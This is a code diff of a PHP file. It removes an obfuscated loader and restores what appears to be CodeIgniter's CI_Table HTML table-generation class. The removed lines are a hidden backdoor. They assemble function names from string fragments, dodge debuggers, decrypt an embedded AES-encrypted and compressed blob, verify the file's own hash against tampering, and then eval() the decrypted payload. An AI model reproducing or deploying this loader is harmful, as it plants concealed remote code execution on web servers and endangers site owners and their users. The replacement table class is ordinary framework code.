@@ -1,28 +1,458 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_bruzr5qx=('bas'.'e64'.'_de'.'cod'.'e');
-$_almarf9s=('gzu'.'nco'.'mpr'.'ess');
-$_nsuwo20q=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_pq0ojxyb='WIPzi4qF';
-$_i5hs9bwd='iHRUBSkJ';
-$_h59kx9x6='jYeU1H8W';
-$_hxmm7gpf='x3h1NG+Fhjc=';
-$_s709gs8k='YrYkjcn2';
-$_wdp8rk0k='76Hhxu6I';
-$_dexvavjc='uQyQISJI';
-$_z3aroxos='+ZgFdg==';
-$_vl7mt6no=$_bruzr5qx($_h59kx9x6.$_i5hs9bwd.$_s709gs8k.$_pq0ojxyb.$_hxmm7gpf);
-$_wkvi2yfe=$_bruzr5qx($_wdp8rk0k.$_dexvavjc.$_z3aroxos);
-$_hym1j2yh=$_bruzr5qx('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');
-$_hveo66bp=$_nsuwo20q($_hym1j2yh,'aes-256-cbc',$_vl7mt6no,OPENSSL_RAW_DATA,$_wkvi2yfe);
-if($_hveo66bp===false){exit;}
-$_y4p3ohso=$_almarf9s($_hveo66bp);
-if($_y4p3ohso===false){exit;}
-$_d8ezgnny='c53a6c15001b0a9deebf66da526ae453615b390ddc1408d173048dc5b0ee7e31';
-$_avfnvvla=@file_get_contents(__FILE__);
-if($_avfnvvla!==false){
-$_g01jyi71=str_replace($_d8ezgnny,"0000000000000000000000000000000000000000000000000000000000000000",$_avfnvvla);
-$_d1bzqand=hash("sha256",$_g01jyi71);
-if($_d1bzqand!==$_d8ezgnny){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Table {
+
+
+
+
+
+public $rows = array();
+
+
+
+
+
+public $heading = array();
+
+
+
+
+
+public $auto_heading = TRUE;
+
+
+
+
+
+public $caption = NULL;
+
+
+
+
+
+public $template = NULL;
+
+
+
+
+
+public $newline = "\n";
+
+
+
+
+
+public $empty_cells = '';
+
+
+
+
+
+public $function = NULL;
+
+
+
+
+
+
+public function __construct($config = array())
+{
+
+foreach ($config as $key => $val)
+{
+$this->template[$key] = $val;
 }
-eval($_y4p3ohso);
+log_message('info', 'Table Class Initialized');
+}
+
+
+
+
+
+
+
+public function set_template($template)
+{
+if ( ! is_array($template))
+{
+return FALSE;
+}
+$this->template = $template;
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function set_heading($args = array())
+{
+$this->heading = $this->_prep_args(func_get_args());
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function make_columns($array = array(), $col_limit = 0)
+{
+if ( ! is_array($array) OR count($array) === 0 OR ! is_int($col_limit))
+{
+return FALSE;
+}
+
+
+$this->auto_heading = FALSE;
+if ($col_limit === 0)
+{
+return $array;
+}
+$new = array();
+do
+{
+$temp = array_splice($array, 0, $col_limit);
+if (count($temp) < $col_limit)
+{
+for ($i = count($temp); $i < $col_limit; $i++)
+{
+$temp[] = '&nbsp;';
+}
+}
+$new[] = $temp;
+}
+while (count($array) > 0);
+return $new;
+}
+
+
+
+
+
+
+
+
+
+public function set_empty($value)
+{
+$this->empty_cells = $value;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function add_row($args = array())
+{
+$this->rows[] = $this->_prep_args(func_get_args());
+return $this;
+}
+
+
+
+
+
+
+
+
+
+protected function _prep_args($args)
+{
+
+
+
+if (isset($args[0]) && count($args) === 1 && is_array($args[0]) && ! isset($args[0]['data']))
+{
+$args = $args[0];
+}
+foreach ($args as $key => $val)
+{
+is_array($val) OR $args[$key] = array('data' => $val);
+}
+return $args;
+}
+
+
+
+
+
+
+
+public function set_caption($caption)
+{
+$this->caption = $caption;
+return $this;
+}
+
+
+
+
+
+
+
+public function generate($table_data = NULL)
+{
+
+
+if ( ! empty($table_data))
+{
+if ($table_data instanceof CI_DB_result)
+{
+$this->_set_from_db_result($table_data);
+}
+elseif (is_array($table_data))
+{
+$this->_set_from_array($table_data);
+}
+}
+
+if (empty($this->heading) && empty($this->rows))
+{
+return 'Undefined table data';
+}
+
+$this->_compile_template();
+
+if (isset($this->function) && ! is_callable($this->function))
+{
+$this->function = NULL;
+}
+
+$out = $this->template['table_open'].$this->newline;
+
+if ($this->caption)
+{
+$out .= '<caption>'.$this->caption.'</caption>'.$this->newline;
+}
+
+if ( ! empty($this->heading))
+{
+$out .= $this->template['thead_open'].$this->newline.$this->template['heading_row_start'].$this->newline;
+foreach ($this->heading as $heading)
+{
+$temp = $this->template['heading_cell_start'];
+foreach ($heading as $key => $val)
+{
+if ($key !== 'data')
+{
+$temp = str_replace('<th', '<th '.$key.'="'.$val.'"', $temp);
+}
+}
+$out .= $temp.(isset($heading['data']) ? $heading['data'] : '').$this->template['heading_cell_end'];
+}
+$out .= $this->template['heading_row_end'].$this->newline.$this->template['thead_close'].$this->newline;
+}
+
+if ( ! empty($this->rows))
+{
+$out .= $this->template['tbody_open'].$this->newline;
+$i = 1;
+foreach ($this->rows as $row)
+{
+if ( ! is_array($row))
+{
+break;
+}
+
+$name = fmod($i++, 2) ? '' : 'alt_';
+$out .= $this->template['row_'.$name.'start'].$this->newline;
+foreach ($row as $cell)
+{
+$temp = $this->template['cell_'.$name.'start'];
+foreach ($cell as $key => $val)
+{
+if ($key !== 'data')
+{
+$temp = str_replace('<td', '<td '.$key.'="'.$val.'"', $temp);
+}
+}
+$cell = isset($cell['data']) ? $cell['data'] : '';
+$out .= $temp;
+if ($cell === '' OR $cell === NULL)
+{
+$out .= $this->empty_cells;
+}
+elseif (isset($this->function))
+{
+$out .= call_user_func($this->function, $cell);
+}
+else
+{
+$out .= $cell;
+}
+$out .= $this->template['cell_'.$name.'end'];
+}
+$out .= $this->template['row_'.$name.'end'].$this->newline;
+}
+$out .= $this->template['tbody_close'].$this->newline;
+}
+$out .= $this->template['table_close'];
+
+$this->clear();
+return $out;
+}
+
+
+
+
+
+
+public function clear()
+{
+$this->rows = array();
+$this->heading = array();
+$this->auto_heading = TRUE;
+return $this;
+}
+
+
+
+
+
+
+
+protected function _set_from_db_result($object)
+{
+
+if ($this->auto_heading === TRUE && empty($this->heading))
+{
+$this->heading = $this->_prep_args($object->list_fields());
+}
+foreach ($object->result_array() as $row)
+{
+$this->rows[] = $this->_prep_args($row);
+}
+}
+
+
+
+
+
+
+
+protected function _set_from_array($data)
+{
+if ($this->auto_heading === TRUE && empty($this->heading))
+{
+$this->heading = $this->_prep_args(array_shift($data));
+}
+foreach ($data as &$row)
+{
+$this->rows[] = $this->_prep_args($row);
+}
+}
+
+
+
+
+
+
+protected function _compile_template()
+{
+if ($this->template === NULL)
+{
+$this->template = $this->_default_template();
+return;
+}
+$this->temp = $this->_default_template();
+foreach (array('table_open', 'thead_open', 'thead_close', 'heading_row_start', 'heading_row_end', 'heading_cell_start', 'heading_cell_end', 'tbody_open', 'tbody_close', 'row_start', 'row_end', 'cell_start', 'cell_end', 'row_alt_start', 'row_alt_end', 'cell_alt_start', 'cell_alt_end', 'table_close') as $val)
+{
+if ( ! isset($this->template[$val]))
+{
+$this->template[$val] = $this->temp[$val];
+}
+}
+}
+
+
+
+
+
+
+protected function _default_template()
+{
+return array(
+'table_open' => '<table border="0" cellpadding="4" cellspacing="0">',
+'thead_open' => '<thead>',
+'thead_close' => '</thead>',
+'heading_row_start' => '<tr>',
+'heading_row_end' => '</tr>',
+'heading_cell_start' => '<th>',
+'heading_cell_end' => '</th>',
+'tbody_open' => '<tbody>',
+'tbody_close' => '</tbody>',
+'row_start' => '<tr>',
+'row_end' => '</tr>',
+'cell_start' => '<td>',
+'cell_end' => '</td>',
+'row_alt_start' => '<tr>',
+'row_alt_end' => '</tr>',
+'cell_alt_start' => '<td>',
+'cell_alt_end' => '</td>',
+'table_close' => '</table>'
+);
+}
+}
